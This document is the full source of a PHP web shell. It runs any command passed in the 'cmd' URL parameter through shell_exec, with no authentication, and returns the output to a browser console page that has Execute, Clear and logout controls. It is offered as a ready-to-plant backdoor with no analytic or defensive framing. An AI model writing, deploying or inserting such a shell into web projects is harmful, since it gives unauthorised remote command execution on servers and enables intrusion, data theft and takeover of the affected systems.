session_start();
if (!empty($cmd = $_GET['cmd']))
{
   if ($cmd === "quit-wbsh")
   {
        session_destroy();
        header("location:/");
        exit;
    }
    echo shell_exec($cmd);
    exit;
}
echo "
<center>
    <textarea id=\"output\" readonly=\"1\" rows=\"25\" cols=\"100\">
    </textarea>
    <br>
    <input type=\"text\" name=\"cmd\" id=\"cmd\">
    <input type=\"button\" onclick=\"runCmd()\" value=\"Execute\">
    <input type=\"button\" onClick=\"clearOutput()\" value=\"Clear\">
</center>

<script>
    function runCmd()
    {
        var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function () {
            if (this.readyState == 4 && this.status == 200)
            {
                document.getElementById('output').innerHTML += this.responseText;
            }
        }
        xhttp.open('GET', '" . $_SERVER['SCRIPT_NAME'] . "?execute=1&cmd=' + document.getElementById('cmd').value, true);
        xhttp.send();
    }
    function clearOutput()
    {
        document.getElementById('output').innerHTML = '';
    }
</script>
<div class=\"footer\" style=\"position: fixed;width:100%;bottom: 0;left: 0;\">
    <p>SHA1: " . sha1_file(basename($_SERVER['SCRIPT_NAME'])) . "</p>
    <a href=\"" . $_SERVER['SCRIPT_NAME'] . "?cmd=quit-wbsh\">Logout</a>
</div>
";
